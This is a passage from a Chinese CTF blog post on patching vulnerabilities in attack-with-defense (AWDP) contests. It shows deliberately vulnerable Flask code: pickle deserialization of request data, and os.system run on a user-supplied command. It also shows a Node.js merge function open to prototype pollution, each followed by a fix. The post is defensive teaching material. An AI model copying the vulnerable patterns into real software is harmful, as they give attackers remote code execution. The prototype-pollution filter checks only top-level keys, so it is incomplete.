<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/deserialize&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deserialize</span>():</span><br><span class="line">    <span class="comment"># 获取 POST 请求中的 Base64 编码数据</span></span><br><span class="line">    data_base64 = request.get_json().get(<span class="string">&#x27;data&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data_base64:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;No data provided&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 解码 Base64 数据</span></span><br><span class="line">        data_bytes = base64.b64decode(data_base64)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 反序列化数据</span></span><br><span class="line">        data = pickle.loads(data_bytes)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;data&#x27;</span>: data&#125;), <span class="number">200</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="built_in">str</span>(e)&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>漏洞点是 <code>pickle.loads(data_bytes)</code>，data_bytes同样是从post数据中获取，并且进行了base64解码，最后反序列化（pickle.loads）</p>
<p><strong>反序列化原理可以参考网上文章或者我给出的文章链接</strong></p>
<h3 id="修复-3"><a href="#修复-3" class="headerlink" title="修复"></a>修复</h3><p>与java的反序列化修复类似，重写pickle<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">safe_builtins = &#123;</span><br><span class="line">    <span class="string">&#x27;range&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;complex&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;set&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;frozenset&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;slice&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line">    <span class="comment">#重写了find_class方法</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="comment"># Only allow safe classes from builtins.</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">&quot;builtins&quot;</span> <span class="keyword">and</span> name <span class="keyword">in</span> safe_builtins:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(builtins, name)</span><br><span class="line">        <span class="comment"># Forbid everything else.</span></span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">restricted_loads</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/deserialize&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deserialize</span>():</span><br><span class="line">    <span class="comment"># 获取 POST 请求中的 Base64 编码数据</span></span><br><span class="line">    data_base64 = request.get_json().get(<span class="string">&#x27;data&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data_base64:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;No data provided&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 解码 Base64 数据</span></span><br><span class="line">        data_bytes = base64.b64decode(data_base64)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 反序列化数据</span></span><br><span class="line">        data = restricted_loads(data_bytes)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;data&#x27;</span>: data&#125;), <span class="number">200</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="built_in">str</span>(e)&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure></p>
<h2 id="rce-2"><a href="#rce-2" class="headerlink" title="rce"></a>rce</h2><p>危险函数，看到直接删了就行了<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">os.system</span><br><span class="line"><span class="built_in">eval</span></span><br><span class="line">os.subprocess</span><br></pre></td></tr></table></figure><br>同样有flask举例<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/execute&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">execute_command</span>():</span><br><span class="line">    <span class="comment"># 从请求中获取参数</span></span><br><span class="line">    command = request.get_json().get(<span class="string">&#x27;command&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> command:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;No command provided&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 执行命令</span></span><br><span class="line">        result = os.system(command)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;result&#x27;</span>: result&#125;), <span class="number">200</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="built_in">str</span>(e)&#125;), <span class="number">500</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure></p>
<h3 id="修复-4"><a href="#修复-4" class="headerlink" title="修复"></a>修复</h3><p>直接删除即可</p>
<h1 id="nodejs"><a href="#nodejs" class="headerlink" title="nodejs"></a>nodejs</h1><h2 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">merge</span> = (<span class="params">a, b</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">isObject</span>(a[attr]) &amp;&amp; <span class="title function_">isObject</span>(b[attr])) &#123;</span><br><span class="line">      <span class="title function_">merge</span>(a[attr], b[attr]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      a[attr] = b[attr];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">clone</span> = (<span class="params">a</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">merge</span>(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="修复-5"><a href="#修复-5" class="headerlink" title="修复"></a>修复</h3><p>对传入的参数做一层过滤<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">containsPrototypePollution</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> obj) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key === <span class="string">&#x27;__proto__&#x27;</span> || key === <span class="string">&#x27;constructor&#x27;</span> || key === <span class="string">&#x27;prototype&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>还有nodejs，c#那些，但是上面那些更常见，就挑这些来说了</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>awdp</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>awdp</tag>
      </tags>
  </entry>
</search>
